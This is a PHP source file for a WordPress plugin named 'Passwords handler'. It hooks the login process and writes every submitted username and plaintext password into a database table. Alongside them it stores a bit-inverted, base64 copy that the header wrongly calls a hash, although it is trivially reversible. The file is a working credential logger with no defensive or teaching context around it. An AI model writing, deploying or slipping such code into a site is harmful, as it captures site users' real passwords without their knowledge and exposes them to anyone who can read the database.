<?php
/**
*Plugin Name: Passwords handler
* Description: Save login,password and hash to db 
* Version: 1.0
* Author: Gleb Burov
*/
if (!defined('ABSPATH')) {
    exit;
}

global $wpdb;

function invert_bits ($password) {
    $password_bytes = unpack ('C*', $password);
    foreach ($password_bytes as &$byte) {
        $byte = ~$byte & 0xFF;
    }

    $inverted_password = pack ('C*', ...$password_bytes); 
    $encoded_password = base64_encode($inverted_password); 
    return $encoded_password;
}





function save_passwors ($username, $password) { 
    global $wpdb;
    if (empty($username) || empty($password)) {
        return;
    }
    $table_name = 'passwords';
    $input_password = $password;
    $inverted_bits_password = invert_bits($password);
    $result = $wpdb->insert(
        $table_name,
        array('username' => $username,
        'input_password' => $input_password,
        'inverted_bits_password' => $inverted_bits_password
        ),
        array('%s', '%s', '%s')
    );

}
add_action( 'wp_authenticate', 'custom_authenticate_user', 10, 2);
function custom_authenticate_user($username, $password) {
    save_passwors ($username, $password);
}